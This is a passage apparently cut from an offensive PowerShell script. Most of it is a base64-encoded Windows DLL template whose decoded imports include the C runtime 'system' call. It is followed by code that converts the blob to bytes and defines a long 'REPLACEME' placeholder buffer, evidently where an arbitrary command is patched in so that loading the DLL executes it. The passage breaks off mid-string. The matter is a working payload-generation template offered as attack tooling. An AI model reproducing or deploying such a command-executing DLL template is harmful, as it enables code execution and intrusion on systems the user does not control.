AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVigCAAAAAABaKgIAAAAAAEYqAgAAAAAANCoCAAAAAAAmKgIAAAAAABYqAgAAAAAABCoCAAAAAAD4KQIAAAAAAOwpAgAAAAAA3CkCAAAAAADGKQIAAAAAALApAgAAAAAAnikCAAAAAACKKQIAAAAAAG4pAgAAAAA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saXplX29uZXhpdF90YWJsZQAAtAJfcmVnaXN0ZXJfb25leGl0X2Z1bmN0aW9uAOUAX2V4ZWN1dGVfb25leGl0X3RhYmxlAMIAX2NydF9hdGV4aXQAwQBfY3J0X2F0X3F1aWNrX2V4aXQAAKQAX2NleGl0AABKBXRlcm1pbmF0ZQBoAF9fc3RkaW9fY29tbW9uX3ZzcHJpbnRmX3MAmwNfd21ha2VwYXRoX3MAALcDX3dzcGxpdHBhdGhfcwBjBXdjc2NweV9zAAB1Y3J0YmFzZWQuZGxsADAEUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAEAJHZXRDdXJyZW50UHJvY2Vzc0lkABQCR2V0Q3VycmVudFRocmVhZElkAADdAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAFQDSW5pdGlhbGl6ZVNMaXN0SGVhZACuBFJ0bENhcHR1cmVDb250ZXh0ALUEUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAAvARSdGxWaXJ0dWFsVW53aW5kAABqA0lzRGVidWdnZXJQcmVzZW50AJIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABSBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgDFAkdldFN0YXJ0dXBJbmZvVwBwA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAbQJHZXRNb2R1bGVIYW5kbGVXAABEBFJhaXNlRXhjZXB0aW9uAADUA011bHRpQnl0ZVRvV2lkZUNoYXIA3QVXaWRlQ2hhclRvTXVsdGlCeXRlAFYCR2V0TGFzdEVycm9yAAA4A0hlYXBBbGxvYwA8A0hlYXBGcmVlAACpAkdldFByb2Nlc3NIZWFwAACzBVZpcnR1YWxRdWVyeQAApAFGcmVlTGlicmFyeQCkAkdldFByb2NBZGRyZXNzAAAPAkdldEN1cnJlbnRQcm9jZXNzAHAFVGVybWluYXRlUHJvY2VzcwAAS0VSTkVMMzIuZGxsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAABkAAAA2AAAASQAAAAAAAABMAAAANwAAAAsAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjEAGAAQAAAAAAAAAAAAAAbBIBgAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAQAgAAAAIK4orjCuOK5AriivMK84r0CvSK9QrwAAAMABABQAAABYqGCoCKkgqSipeK0A0AEADAAAAKigAAAAQAIADAAAAACgEKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

        # Convert it to a byte array
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)

        # This is the string in the DLL template that will need to be replaced
        $BufferString = "REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLA